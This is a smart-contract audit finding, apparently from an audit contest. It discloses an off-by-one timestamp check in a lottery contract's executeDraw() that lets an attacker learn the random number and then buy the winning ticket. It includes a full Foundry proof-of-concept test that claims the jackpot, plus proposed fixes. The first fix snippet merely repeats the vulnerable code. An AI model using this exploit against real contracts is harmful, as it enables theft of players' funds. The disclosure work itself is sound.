---
id: 25745
severity: "Medium"
---

# Possibility to steal jackpot bypassing restrictions in the executeDraw()

## Description



## Proof of Concept

This vulnerability is possible to use when contract has been deployed with COOL_DOWN_PERIOD = 0;

The `executeDraw()` is allowed to be called at the last second of draw due to an incorrect comparison `block.timestamp` with `drawScheduledAt(currentDraw)`, which is start of draw.

function executeDraw() external override whenNotExecutingDraw { // slither-disable-next-line timestamp if (block.timestamp < drawScheduledAt(currentDraw)) { //@dingo should be <= here revert ExecutingDrawTooEarly(); } returnUnclaimedJackpotToThePot(); drawExecutionInProgress = true; requestRandomNumber(); emit StartedExecutingDraw(currentDraw); }

Also modifier in LotterySetup.sol allows same action:

modifier beforeTicketRegistrationDeadline(uint128 drawId) { // slither-disable-next-line timestamp if (block.timestamp > ticketRegistrationDeadline(drawId)) { //@dingo should be >= here revert TicketRegistrationClosed(drawId); } _; }

Exploit:

Attacker is waiting for last second of `PERIOD` (between to draws).

Call `executeDraw()`. It will affect a `requestRandomNumber()` and chainlink will return random number to `onRandomNumberFulfilled()` at `RNSourceController.sol`.

Attacker now could read received RandomNumber:

uint256 winningTicketTemp = lot.winningTicket(0);

Attacker buys new ticket with randomNumber:

<!---->

uint128[] memory drawId2 = new uint128[](1); drawId2[0] = 0; uint120[] memory winningArray = new uint120[](1); winningArray[0] = uint120(winningTicketTemp);

lot.buyTickets(drawId2, winningArray, address(0), address(0));

Claim winnings:

uint256[] memory ticketID = new uint256[](1); ticketID[0] = 1; lot.claimWinningTickets(ticketID);

Exploit code:

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./LotteryTestBase.sol";
import "../src/Lottery.sol";
import "./TestToken.sol";
import "test/TestHelpers.sol";

contract LotteryTestCustom is LotteryTestBase {
  address public eoa = address(1234);
  address public attacker = address(1235);

  function testExploit() public {
    vm.warp(0);
    Lottery lot = new Lottery(
      LotterySetupParams(
        rewardToken,
        LotteryDrawSchedule(2 * PERIOD, PERIOD, COOL_DOWN_PERIOD),
        TICKET_PRICE,
        SELECTION_SIZE,
        SELECTION_MAX,
        EXPECTED_PAYOUT,
        fixedRewards
      ),
      playerRewardFirstDraw,
      playerRewardDecrease,
      rewardsToReferrersPerDraw,
      MAX_RN_FAILED_ATTEMPTS,
      MAX_RN_REQUEST_DELAY
    );

    lot.initSource(IRNSource(randomNumberSource));

    vm.startPrank(eoa);
    rewardToken.mint(1000 ether);
    rewardToken.approve(address(lot), 100 ether);
    rewardToken.transfer(address(lot), 100 ether);
    vm.warp(60 * 60 * 24 + 1);
    lot.finalizeInitialPotRaise();

    uint128[] memory drawId = new uint128[](1);
    drawId[0] = 0;
    uint120[] memory ticketsDigits = new uint120[](1);
    ticketsDigits[0] = uint120(0x0F); //1,2,3,4 numbers choosed;

    ///@dev Origin user buying ticket.
    lot.buyTickets(drawId, ticketsDigits, address(0), address(0));
    vm.stopPrank();

    //====start of attack====
    vm.startPrank(attacker);
    rewardToken.mint(1000 ether);
    rewardToken.approve(address(lot), 100 ether);

    console.log("attacker balance before buying ticket:               ", rewardToken.balanceOf(attacker));

    vm.warp(172800); //Attacker is waiting for deadline of draw period, than he could call executeDraw();
    lot.executeDraw(); //Due to the lack of condition check in executeDraw(`<` should be `<=`). Also call was sent to chainlink.
    uint256 randomNumber = 0x00;
    vm.stopPrank();

    vm.prank(address(randomNumberSource));
    lot.onRandomNumberFulfilled(randomNumber); //chainLink push here randomNumber;
    uint256 winningTicketTemp = lot.winningTicket(0); //random number from chainlink stores here.
    console.log("Winning ticket number is:                            ", winningTicketTemp);

    vm.startPrank(attacker);
    uint128[] memory drawId2 = new uint128[](1);
    drawId2[0] = 0;
    uint120[] memory winningArray = new uint120[](1);
    winningArray[0] = uint120(winningTicketTemp); //@audit we will buy ticket with stealed random number below;

    lot.buyTickets(drawId2, winningArray, address(0), address(0)); //attacker can buy ticket with stealed random number.

    uint256[] memory ticketID = new uint256[](1);
    ticketID[0] = 1;
    lot.claimWinningTickets(ticketID); //attacker claims winninngs.
    vm.stopPrank();

    console.log("attacker balance after all:                          ", rewardToken.balanceOf(attacker));
  }

  function reconstructTicket(
    uint256 randomNumber,
    uint8 selectionSize,
    uint8 selectionMax
  ) internal pure returns (uint120 ticket) {
    /// Ticket must contain unique numbers, so we are using smaller selection count in each iteration
    /// It basically means that, once `x` numbers are selected our choice is smaller for `x` numbers
    uint8[] memory numbers = new uint8[](selectionSize);
    uint256 currentSelectionCount = uint256(selectionMax);

    for (uint256 i = 0; i < selectionSize; ++i) {
      numbers[i] = uint8(randomNumber % currentSelectionCount);
      randomNumber /= currentSelectionCount;
      currentSelectionCount--;
    }

    bool[] memory selected = new bool[](selectionMax);

    for (uint256 i = 0; i < selectionSize; ++i) {
      uint8 currentNumber = numbers[i];
      // check current selection for numbers smaller than current and increase if needed
      for (uint256 j = 0; j <= currentNumber; ++j) {
        if (selected[j]) {
          currentNumber++;
        }
      }
      selected[currentNumber] = true;
      ticket |= ((uint120(1) << currentNumber));
    }
  }
}
```

## Impact

Attacker can run `executeDraw()` in `Lottery.sol`, receive random numbers and *then* buy tickets with known numbers in one block.

Harm: Jackpot

## Recommendation

1. Change `<` by `<=`:

<!---->

function executeDraw() external override whenNotExecutingDraw { // slither-disable-next-line timestamp if (block.timestamp < drawScheduledAt(currentDraw)) { //@dingo should be <= here revert ExecutingDrawTooEarly(); } returnUnclaimedJackpotToThePot(); drawExecutionInProgress = true; requestRandomNumber(); emit StartedExecutingDraw(currentDraw); }

2. Change `>` by `>=`:

```
   modifier beforeTicketRegistrationDeadline(uint128 drawId) {
        // slither-disable-next-line timestamp
        if (block.timestamp > ticketRegistrationDeadline(drawId)) { //@dingo should be >= here
            revert TicketRegistrationClosed(drawId);
        }
        _;
    }
```
